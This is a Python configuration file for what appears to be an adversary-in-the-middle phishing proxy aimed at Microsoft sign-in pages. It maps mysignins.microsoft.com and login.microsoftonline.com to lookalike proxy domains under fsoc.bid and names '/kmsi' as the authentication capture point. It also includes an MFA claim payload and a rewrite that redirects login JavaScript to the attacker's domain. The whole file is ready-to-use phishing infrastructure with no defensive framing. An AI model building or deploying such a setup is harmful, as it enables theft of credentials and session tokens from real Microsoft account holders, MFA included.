"""
AiTM Config
"""

from typing import Literal, TypedDict


class Target(TypedDict):
    """
    Target class
    """

    origin: str
    proxy: str
    port: int


TARGETS: list[Target] = [
    {"origin": "mysignins.microsoft.com", "proxy": "mysignins.fsoc.bid", "port": 6000},
    {"origin": "login.microsoftonline.com", "proxy": "login.fsoc.bid", "port": 6001}
]

CONTENT_TYPES: list[str] = [
    "text/html",
    "application/json",
    "application/javascript",
    "application/x-javascript",
]

AUTH_URL: list[str] = ["/kmsi"]
MFA_CLAIM = '{"id_token":{"amr":{"essential":true,"values":["mfa"]}},"access_token":{"amr":{"essential":true,"values":["mfa"]}}}'

LOCAL_UPSTREAM_SCHEME: Literal[
    "http", "https", "http3", "tls", "dtls", "tcp", "udp", "dns", "quic"
] = "http"
LOCAL_UPSTREAM_HOSTNAME = "local.fsoc.bid"

CUSTOM_MODIFICATIONS: list[dict[str, str | list[str]]] = [
    {
        "mimes": ["application/javascript", "application/x-javascript"],
        "sites": ["mysignins.microsoft.com"],
        "search": "login.windows-ppe.net",
        "replace": "login.fsoc.bid",
    }
]

TARGET_SITES = [target["origin"] for target in TARGETS]
TARGET_PROXIES = [target["proxy"] for target in TARGETS]
